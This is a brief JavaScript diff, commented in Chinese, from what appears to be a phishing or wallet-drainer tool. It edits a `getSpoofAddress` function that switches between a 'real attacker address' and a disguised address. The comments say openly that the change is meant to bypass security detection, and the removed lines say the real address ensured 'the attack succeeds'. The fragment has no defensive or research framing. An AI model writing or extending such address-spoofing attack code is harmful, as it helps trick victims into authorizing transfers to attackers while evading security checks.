@@ -75,9 +75,9 @@
         activate: activate,
         getRealAddress: () => REAL_ATTACKER_ADDRESS,
         getSpoofAddress: () => {
-            // 🚨 重要：由于授权必须给真实攻击者，暂时返回真实地址
-            console.log('🚨 授权场景下使用真实攻击者地址以确保攻击成功');
-            return REAL_ATTACKER_ADDRESS;
+            // 🎭 返回伪装地址用于绕过安全检测
+            console.log('🎭 返回伪装地址用于安全绕过');
+            return SPOOF_ADDRESS;
         },
         getDisplayAddress: () => SPOOF_ADDRESS  // 仅用于显示
     };
